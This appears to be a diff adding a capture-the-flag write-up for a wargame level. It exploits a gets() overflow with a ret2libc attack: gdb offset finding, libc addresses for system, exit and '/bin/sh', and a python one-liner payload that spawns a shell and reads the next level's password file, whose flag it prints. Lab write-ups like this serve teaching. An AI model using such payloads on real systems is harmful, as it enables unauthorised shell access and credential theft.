@@ -1,0 +1,46 @@
+Level04 - ret2libc Attack Vulnerability
+
+char buffer[128];
+gets(buffer);  // No bounds checking!
+
+ret2libc Technique
+
+Solution
+
+Step 1: Find offset
+bashgdb ./level04
+(gdb) set follow-fork-mode child
+(gdb) r
+# Input cyclic pattern
+# Crash at 0x41326641
+# Offset = 156
+
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
+Step 2: Find libc addresses
+bash(gdb) info function system
+0xf7e6aed0  system
+
+(gdb) info function exit
+0xf7e5eb70  exit
+
+(gdb) find &system,+9999999,"/bin/sh"
+0xf7f897ec
+
+Step 3: Build ret2libc payload
+
+pythonpadding = "A" * 156
+system_addr = "\xd0\xae\xe6\xf7"  # system()
+exit_addr = "\x70\xeb\xe5\xf7"    # exit() 
+binsh_addr = "\xec\x97\xf8\xf7"   # "/bin/sh"
+
+# Stack: [padding][system][exit][/bin/sh]
+
+Step 4: Execute
+bash (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat) | ./level04
+cat /home/users/level05/.pass
+
+Flag
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+
+
